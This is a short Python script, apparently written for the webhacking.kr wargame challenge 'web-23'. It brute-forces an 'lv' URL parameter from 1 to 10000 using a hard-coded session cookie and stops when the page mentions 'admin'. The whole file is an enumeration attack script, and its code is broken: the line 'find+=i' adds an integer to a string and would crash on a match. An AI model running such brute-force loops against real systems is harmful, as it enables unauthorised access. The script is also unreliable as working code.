import requests
import string

url="https://webhacking.kr/challenge/web-23/"
cookies={'PHPSESSID':"gk1mslt83s66untd193700chgj"}
ascii_code=string.digits+string.ascii_letters


def repeatTrying(end):
    find=""

    for i in range(1, end+1):
        print("(+) Start > {}".format(i))
        params="?lv={}".format(i)
        find_url=url+params
        response=requests.get(find_url, cookies=cookies)
        if response.text.find("admin")>0:
            find+=i
            break;

    print("find : {}".format(find))
    print("(+) Exit")

if __name__=="__main__":
    repeatTrying(10000)